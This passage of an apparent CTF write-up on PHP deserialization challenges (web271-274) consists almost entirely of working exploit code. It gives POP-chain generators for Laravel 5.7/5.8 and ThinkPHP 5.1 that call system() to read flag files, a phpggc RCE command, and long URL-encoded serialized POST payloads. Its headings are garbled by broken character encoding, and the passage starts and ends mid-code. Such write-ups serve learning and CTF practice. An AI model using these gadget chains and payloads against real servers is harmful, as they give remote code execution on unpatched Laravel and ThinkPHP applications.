punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Application</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$hasBeenBootstrapped</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$bindings</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$bind</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">bindings</span><span class="token operator">=</span><span class="token variable">$bind</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$genericuser</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Auth<span class="token punctuation">\</span>GenericUser</span><span class="token punctuation">(</span>        <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"expectedOutput"</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string double-quoted-string">"expectedQuestions"</span><span class="token operator">=></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token operator">=></span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span>             <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$application</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Application</span><span class="token punctuation">(</span>        <span class="token keyword">array</span><span class="token punctuation">(</span>            <span class="token string double-quoted-string">"Illuminate\Contracts\Console\Kernel"</span><span class="token operator">=></span>                <span class="token keyword">array</span><span class="token punctuation">(</span>                    <span class="token string double-quoted-string">"concrete"</span><span class="token operator">=></span><span class="token string double-quoted-string">"Illuminate\Foundation\Application"</span>                     <span class="token punctuation">)</span>             <span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingcommand</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing<span class="token punctuation">\</span>PendingCommand</span><span class="token punctuation">(</span>        <span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /fl*'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token variable">$genericuser</span><span class="token punctuation">,</span>        <span class="token variable">$application</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingcommand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>æˆ–è€…ä½¿ç”¨phpgcc<code>php  phpggc Laravel/RCE6 &quot;system(&#39;cat /flag&#39;);&quot; --url</code></p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> data<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A44<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CTesting<span class="token operator">%</span><span class="token number">5</span>CPendingCommand<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>command<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>system<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A13<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>parameters<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>tac<span class="token operator">+</span><span class="token operator">%</span><span class="token number">2</span>Ffl<span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>app<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A33<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CApplication<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A22<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>hasBeenBootstrapped<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>bindings<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CContracts<span class="token operator">%</span><span class="token number">5</span>CConsole<span class="token operator">%</span><span class="token number">5</span>CKernel<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>concrete<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A33<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CFoundation<span class="token operator">%</span><span class="token number">5</span>CApplication<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>test<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A27<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CAuth<span class="token operator">%</span><span class="token number">5</span>CGenericUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A13<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>attributes<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>expectedOutput<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">221</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A17<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>expectedQuestions<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">221</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web272-273-Laravel5-8-ååºåˆ—åŒ–æ¼æ´"><a href="#web272-273-Laravel5-8-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="web272-273(Laravel5.8 ååºåˆ—åŒ–æ¼æ´)"></a>web272-273(Laravel5.8 ååºåˆ—åŒ–æ¼æ´)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">PhpParser<span class="token punctuation">\</span>Node<span class="token punctuation">\</span>Scalar<span class="token punctuation">\</span>MagicConst</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Line</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Generator</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">MockDefinition</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Loader</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">EvalLoader</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Dispatcher</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$queueResolver</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">queueResolver</span> <span class="token operator">=</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Console</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">QueuedCommand</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$connection</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">connection</span> <span class="token operator">=</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$events</span><span class="token punctuation">,</span> <span class="token variable">$event</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">events</span> <span class="token operator">=</span> <span class="token variable">$events</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">event</span> <span class="token operator">=</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>    <span class="token variable">$line</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">PhpParser<span class="token punctuation">\</span>Node<span class="token punctuation">\</span>Scalar<span class="token punctuation">\</span>MagicConst<span class="token punctuation">\</span>Line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$mockdefinition</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Mockery<span class="token punctuation">\</span>Generator<span class="token punctuation">\</span>MockDefinition</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;?php system('cat /f*');exit;?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$evalloader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Mockery<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>EvalLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dispatcher</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Bus<span class="token punctuation">\</span>Dispatcher</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$evalloader</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$queuedcommand</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Console<span class="token punctuation">\</span>QueuedCommand</span><span class="token punctuation">(</span><span class="token variable">$mockdefinition</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingbroadcast</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$dispatcher</span><span class="token punctuation">,</span><span class="token variable">$queuedcommand</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingbroadcast</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>æˆ–è€…ä½¿ç”¨phpgcc</p><pre class="language-php" data-language="php"><code class="language-php">Payload<span class="token punctuation">:</span><span class="token constant">POST</span><span class="token punctuation">:</span> data<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A29<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CSupport<span class="token operator">%</span><span class="token number">5</span>CMessageBag<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>messages<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>format<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A40<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBroadcasting<span class="token operator">%</span><span class="token number">5</span>CPendingBroadcast<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>events<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBus<span class="token operator">%</span><span class="token number">5</span>CDispatcher<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A16<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>queueResolver<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Ba<span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bi<span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CLoader<span class="token operator">%</span><span class="token number">5</span>CEvalLoader<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A0<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>B<span class="token operator">%</span><span class="token number">7</span>Di<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>load<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>event<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A38<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Illuminate<span class="token operator">%</span><span class="token number">5</span>CBroadcasting<span class="token operator">%</span><span class="token number">5</span>CBroadcastEvent<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>connection<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A32<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CGenerator<span class="token operator">%</span><span class="token number">5</span>CMockDefinition<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A2<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A9<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>config<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BO<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Mockery<span class="token operator">%</span><span class="token number">5</span>CGenerator<span class="token operator">%</span><span class="token number">5</span>CMockConfiguration<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>abcdefg<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>Ds<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">2</span>A<span class="token operator">%</span><span class="token number">00</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A35<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">%</span><span class="token number">20</span>system<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span>cat<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">2</span>Fflag<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span>exit<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D<span class="token operator">%</span><span class="token number">7</span>D</code></pre><h4 id="web274-Thinkphp5-1ååºåˆ—åŒ–æ¼æ´"><a href="#web274-Thinkphp5-1ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="web274(Thinkphp5.1ååºåˆ—åŒ–æ¼æ´)"></a>web274(Thinkphp5.1ååºåˆ—åŒ–æ¼æ´)</h4><p><a href="https://blog.csdn.net/rfrder/article/details/113843768">Thinkphp5.1 ååºåˆ—åŒ–æ¼æ´å¤ç°</a></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"lin"</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string double-quoted-string">"calc.exe"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"calc"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"lin"</span><span class="token operator">=></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 